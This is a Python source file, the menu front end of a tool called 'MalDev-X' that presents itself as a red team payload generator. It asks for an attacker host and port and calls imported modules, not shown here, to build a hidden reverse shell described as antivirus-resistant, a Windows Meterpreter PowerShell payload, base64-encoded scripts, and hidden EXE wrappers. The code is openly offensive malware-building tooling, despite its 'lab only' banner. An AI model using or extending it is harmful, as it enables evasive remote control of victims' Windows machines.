import os
from colorama import init, Fore, Style
from modules import meterpreter_win, pwsh_implant, encode_base64, csharp_exe_generator

init(autoreset=True)

OUTPUT_DIR = "output"
os.makedirs(OUTPUT_DIR, exist_ok=True)

from colorama import Fore, Style

def print_banner():
    banner = f"""
{Fore.RED}{Style.BRIGHT}██████╗ ███████╗██████╗     ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔════╝██╔══██╗    ██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝█████╗  ██║  ██║    ███████╗███████║█████╗  ██║     ██║     
██╔══██╗██╔══╝  ██║  ██║    ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║███████╗██████╔╝    ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

   {Fore.YELLOW}⚡ MalDev-X | Red Team Payload Generator ⚡
   {Fore.GREEN}💻 Developer : Ashish Prajapati
   {Fore.YELLOW}🎯 Purpose   : Red Team | 
   {Fore.GREEN}🚀 Version   : 1.0 (2025)
   {Fore.WHITE}───────────────────────────────────────────────
   {Fore.RED}💀 Use in LAB only | For Ethical Red Teaming 💀
"""
    print(banner)


def main():
    while True:
        print_banner()
        print("Select payload type:")
        print("1) C# Hidden Reverse Shell (Lab/AV-resistant)")
        print("2) Windows Meterpreter (PowerShell)")
        print("3) Base64-encoded PowerShell script (.ps1)")
        print("4) Convert existing PS1 to hidden EXE")
        print("5) Exit")

        choice = input("Choice: ").strip()

        if choice == "1":
            attacker_ip = input("Enter LHOST: ").strip()
            attacker_port = input("Enter LPORT: ").strip()
            filename = input("Enter filename (optional): ").strip()
            file_path = pwsh_implant.generate_powershell_and_exe(attacker_ip, attacker_port, filename)
            print(f"{Fore.GREEN}[+] Payload created: {file_path}")

        elif choice == "2":
            attacker_ip = input("Enter LHOST: ").strip()
            attacker_port = input("Enter LPORT: ").strip()
            filename = input("Enter filename (optional): ").strip()
            file_path = meterpreter_win.generate_windows_meterpreter(attacker_ip, attacker_port, filename)
            print(f"{Fore.GREEN}[+] Windows Meterpreter payload: {file_path}")

        elif choice == "3":
            ps_file_path = input("Enter path to existing .ps1 file: ").strip()
            if not os.path.isfile(ps_file_path):
                print(f"{Fore.RED}[!] File not found: {ps_file_path}")
                continue
            b64_file = encode_base64.generate_ps_base64_from_file(ps_file_path)
            print(f"{Fore.GREEN}[+] Base64-encoded .ps1 saved: {b64_file}")

        elif choice == "4":
            ps_file_path = input("Enter path to existing .ps1 file: ").strip()
            if not os.path.isfile(ps_file_path):
                print(f"{Fore.RED}[!] File not found: {ps_file_path}")
                continue
            exe_name = input("Enter desired EXE name (without extension, optional): ").strip()
            exe_path = csharp_exe_generator.generate_csharp_exe_from_ps(ps_file_path, exe_name)
            if exe_path:
                print(f"{Fore.GREEN}[+] Hidden EXE created: {exe_path}")
            else:
                print(f"{Fore.RED}[!] EXE generation failed.")

        elif choice == "5":
            print("[i] Exiting...")
            break

        else:
            print(f"{Fore.RED}[!] Invalid choice. Try again.")

        input("\nPress Enter to continue...")
        os.system("clear" if os.name != "nt" else "cls")


if __name__ == "__main__":
    main()
